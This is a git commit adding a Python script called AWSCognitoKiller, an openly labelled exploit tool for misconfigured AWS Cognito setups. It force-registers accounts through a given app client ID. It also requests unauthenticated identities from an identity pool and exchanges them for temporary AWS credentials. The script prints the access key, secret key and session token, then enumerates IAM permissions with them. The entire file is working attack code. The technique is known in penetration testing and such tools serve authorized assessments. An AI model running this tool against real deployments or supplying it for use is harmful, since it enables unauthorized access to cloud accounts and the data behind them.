37d206db788d61211d72a53919ac7ec65ddd250d
LTiDi2000 <68416745+LTiDi2000@users.noreply.github.com>
2022-12-28 02:39:01 +0700

    Add files via upload

---
+++ AWSCognitoKiller.py
@@ -0,0 +1,105 @@
+import requests
+import json
+from termcolor import colored
+import argparse
+import os
+import subprocess
+from subprocess import PIPE
+from urllib3.util.retry import Retry
+from requests.adapters import HTTPAdapter
+from enumerate_iam.main import enumerate_iam
+import urllib.parse
+
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+global HTTP_CONFIG
+HTTP_CONFIG = None
+
+class ExploitAWSCognito:
+	def __init__(self, region, username, password):
+		self.region = region
+		self.username = username
+		self.password = password
+		self.clientId = None
+		self.identityPoolId = None
+		self.userPoolId = None
+
+	def update(self, clientId=None, identityPoolId=None, userPoolId=None):
+		if clientId:
+			self.clientId = clientId
+		if identityPoolId:
+			self.identityPoolId = identityPoolId
+		if userPoolId:
+			self.userPoolId = userPoolId
+
+
+	def unauthen_exploit(self):
+		self.logProc("\n=================================> EXPLOITING AWS COGNITO UNAUTHEN MISCONFIGURATION <=================================\n")
+		if self.clientId:
+			r = subprocess.Popen(["aws", "cognito-idp", "sign-up", "--client-id", self.clientId, "--username", self.username, "--password", self.password, "--region", self.region], shell=True, stdout=PIPE, stderr=PIPE)
+			stdout, stderr = r.communicate()
+			if len(stdout) > 0:
+				self.logProc(f"[+] {self.region}:{self.clientId} - Force SignUp Check stdout: {stdout}")
+			if len(stderr) > 0:
+				self.logError(f"[+] {self.region}:{self.clientId} - Force SignUp Check stderr: {stderr}")
+
+		if self.identityPoolId:
+			r = subprocess.Popen(["aws", "cognito-identity", "get-id", "--identity-pool-id", f"{self.region}:{self.identityPoolId}", "--region", self.region], shell=True, stdout=PIPE, stderr=PIPE)
+			stdout, stderr = r.communicate()
+			if len(stderr) > 0: 
+				self.logError(f"[+] {self.region}:{self.identityPoolId} - Force Generate Identity ID stderr: {stderr}")
+
+			if b'"IdentityId"' in stdout:
+				json_stdout = json.loads(stdout)
+				self.logProc(f"[+] {self.region}:{self.identityPoolId} - Force Generate Identity ID stdout: {json_stdout}")
+				r = subprocess.Popen(["aws", "cognito-identity", "get-credentials-for-identity", "--identity-id", json_stdout["IdentityId"], "--region", self.region], shell=True, stdout=PIPE, stderr=PIPE)
+				stdout, stderr = r.communicate()
+				if len(stderr) > 0:
+					self.logError(f"[+] {self.region}:{self.identityPoolId} - Force Generate AWS credentials from Identity ID stderr: {stderr}")
+
+				if b'"Credentials"' in stdout:
+					json_stdout = json.loads(stdout)
+					IdentityId =  json_stdout['IdentityId']
+					AccessKeyId = json_stdout['Credentials']['AccessKeyId']
+					SecretKey = json_stdout['Credentials']['SecretKey']
+					SessionToken = json_stdout['Credentials']['SessionToken']
+					Expiration = json_stdout['Credentials']['Expiration']
+					self.logProc(f"[+] {self.region}:{self.identityPoolId} - Unauthorized access to AWS services due to Liberal AWS Credentials !!!")
+					self.logProc(f"\t[!] {self.region}:{self.identityPoolId} - IdentityId: {IdentityId}")
+					self.logProc(f"\t[!] {self.region}:{self.identityPoolId} - AccessKeyId: {AccessKeyId}")
+					self.logProc(f"\t[!] {self.region}:{self.identityPoolId} - SecretKey: {SecretKey}")
+					self.logProc(f"\t[!] {self.region}:{self.identityPoolId} - SessionToken: {SessionToken}")
+					self.logProc(f"\t[!] {self.region}:{self.identityPoolId} - Expiration: {Expiration}")
+
+					enumerate_iam(AccessKeyId, SecretKey, SessionToken, self.region)
+
+
+	def logProc(self, message):
+		print(f"{message}")
+
+	def logError(self, message):
+		print(f"{message}")
+		
+
+
+if __name__ == "__main__":
+	msg = "AWSCognitoKiller"
+	parser = argparse.ArgumentParser(description=msg)
+	parser.add_argument("-region", "--region", help = "Application Region")
+	parser.add_argument("-userPoolId", "--user-pool-id", help = "User Pool ID")
+	parser.add_argument("-clientId", "--client-id", help = "Client ID")
+	parser.add_argument("-identityPoolId", "--identity-pool-id", help = "Identity Pool ID")
+	parser.add_argument("-username", "--username", help = "Username")
+	parser.add_argument("-password", "--password", help = "Password")
+
+	args = parser.parse_args()
+
+	exploit_instance = ExploitAWSCognito(args.region.strip(), args.username.strip(), args.password.strip())
+
+	if args.client_id:
+		exploit_instance.update(clientId=args.client_id.strip())
+	if args.identity_pool_id:
+		exploit_instance.update(identityPoolId=args.identity_pool_id.strip())
+	
+	exploit_instance.unauthen_exploit()
